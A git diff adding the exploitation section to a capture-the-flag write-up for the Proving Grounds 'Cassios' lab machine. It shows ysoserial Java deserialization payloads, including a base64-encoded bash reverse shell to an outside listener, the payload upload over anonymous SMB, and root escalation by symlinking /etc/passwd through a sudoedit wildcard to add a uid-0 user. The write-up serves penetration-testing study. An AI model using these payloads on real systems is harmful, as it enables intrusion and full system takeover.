@@ -1,6 +1,6 @@
 ### Cassios Proving Ground Practice
 
-### Difficulty = Hard
+### Difficulty = Intermediate
 
 ### IP Address = 192.168.88.116
 
@@ -407,15 +407,159 @@ smb: \>
 
 Now i also noticed it uses readObject() function which is vulnerable to deserilization 
 
-So this is an insecure deserilization attack
+So this is an insecure deserilization attack and i got more details about it from https://book.hacktricks.xyz/pentesting-web/deserialization#java-http
 
 Lets create the payload then xD
 
+Using https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md & https://book.hacktricks.xyz/pentesting-web/deserialization#java-http i was able to generate my payload
 
+```
+┌┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Cassios]
+└─$ echo -n 'ping -c 2 192.168.49.66' | base64     
+cGluZyAtYyAyIDE5Mi4xNjguNDkuNjY=
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Cassios]
+└─$ java -jar /home/mark/Desktop/Tools/jexboss/ysoserial.jar CommonsCollections4 "bash -c {echo,cGluZyAtYyAyIDE5Mi4xNjguNDkuNjY=}|{base64,-d}|{bash,-i}" > recycler.ser
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Cassios]
+└─$ ls
+nmapscan  recycler.ser  src
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Cassios]
+└─$ file recycler.ser 
+recycler.ser: Java serialization data, version 5
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Cassios]
+└─$ smbclient "//192.168.66.116/Samantha Konstan"
+Password for [WORKGROUP\mark]:
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> put recycler.ser
+putting file recycler.ser as \recycler.ser (5.3 kb/s) (average 5.3 kb/s)
+smb: \> 
+```
 
+I have tcpdump listening already so now i'll try to click on check status on the web again
+![image](https://user-images.githubusercontent.com/113513376/214202734-4f4e752c-cc59-4a05-a729-b4286bde3f33.png)
 
+And back on tcpdump I get a call back
 
+```
+┌──(mark__haxor)-[~/Desktop/B2B/HTB/Armageddon]
+└─$ sudo tcpdump -i tun0 icmp
+[sudo] password for mark: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+03:50:40.385228 IP 192.168.66.116 > haxor: ICMP echo request, id 1603, seq 1, length 64
+03:50:40.388003 IP haxor > 192.168.66.116: ICMP echo reply, id 1603, seq 1, length 64
+03:50:41.340001 IP 192.168.66.116 > haxor: ICMP echo request, id 1603, seq 2, length 64
+03:50:41.340012 IP haxor > 192.168.66.116: ICMP echo reply, id 1603, seq 2, length 64
+```
 
+Now lets get a reverse shell 
+
+The encoded string is a bash one linear reverse shell encoded in base64
+
+```
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Cassios]
+└─$ java -jar /home/mark/Desktop/Tools/jexboss/ysoserial.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ5LjY2LzgwODAgMD4mMQo=}|{base64,-d}|{bash,-i}" > recycler.ser
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+                                                                                                                                                                                                                   
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Cassios]
+└─$ smbclient "//192.168.66.116/Samantha Konstan"
+Password for [WORKGROUP\mark]:
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> put recycler.ser 
+putting file recycler.ser as \recycler.ser (5.2 kb/s) (average 5.2 kb/s)
+smb: \> 
+ ```                 
+
+Now i'll set a netcat listener on port 8080 and click check status again
+
+Immediately i got a call back on the listener
+```
+┌──(mark__haxor)-[~/_/B2B/Pg/Practice/Cassios]
+└─$ nc -lvnp 8080
+listening on [any] 8080 ...
+connect to [192.168.49.66] from (UNKNOWN) [192.168.66.116] 59508
+bash: no job control in this shell
+[samantha@cassios /]$ 
+```
+
+Now lets stabilize the shell
+
+```
+python -c "import pty; pty.spawn('/bin/bash')"
+export TERM=xterm
+CTRL + Z
+stty raw -echo;fg
+```
+
+Now lets escalate priv to root
+
+Checking for sudo perm shows the user can run sudoedit on any directory/sub-directory as long as the file `recycler.ser` is there
+
+```
+[samantha@cassios ~]$ sudo -l
+Matching Defaults entries for samantha on cassios:
+    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="QTDIR
+    KDEDIR"
+
+User samantha may run the following commands on cassios:
+    (root) NOPASSWD: sudoedit /home/*/*/recycler.ser
+   
+```
+
+Searching for exploits leads me to https://www.exploit-db.com/exploits/37710
+
+```
+[samantha@cassios ~]$ mkdir shell
+[samantha@cassios ~]$ ln -s /etc/passwd shell/recycler.ser
+[samantha@cassios ~]$ sudoedit /home/samantha/shell/recycler.ser 
+[samantha@cassios ~]$ tail /etc/passwd
+systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+polkitd:x:999:998:User for polkitd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+chrony:x:998:996::/var/lib/chrony:/sbin/nologin
+samantha:x:1000:1000::/home/samantha:/bin/bash
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+[samantha@cassios ~]$ 
+```
+
+Now i added a new user to `/etc/passwd` whose cred is `hacker:pass123`
+
+Now i can switch to the user `hacker`
+
+```
+[samantha@cassios ~]$ su hacker
+Password: 
+[root@cassios samantha]# cd /root
+[root@cassios ~]# ls -al
+total 24
+dr-xr-x---.  3 root root 141 Jan 23 21:21 .
+dr-xr-xr-x. 17 root root 244 Sep 23  2020 ..
+-rw-r--r--.  1 root root   0 Nov 30  2020 .bash_history
+-rw-r--r--.  1 root root  18 Dec 28  2013 .bash_logout
+-rw-r--r--.  1 root root 176 Dec 28  2013 .bash_profile
+-rw-r--r--.  1 root root 176 Dec 28  2013 .bashrc
+-rw-r--r--.  1 root root 100 Dec 28  2013 .cshrc
+drwxr-----   3 root root  19 Sep 24  2020 .pki
+-rw-r--r--.  1 root root  33 Jan 23 21:21 proof.txt
+-rw-r--r--.  1 root root 129 Dec 28  2013 .tcshrc
+[root@cassios ~]# 
+```
+
+And we're done 
+
+<br> <br>
+[Back To Home](../../index.md)
+<br>
 
                                              
 
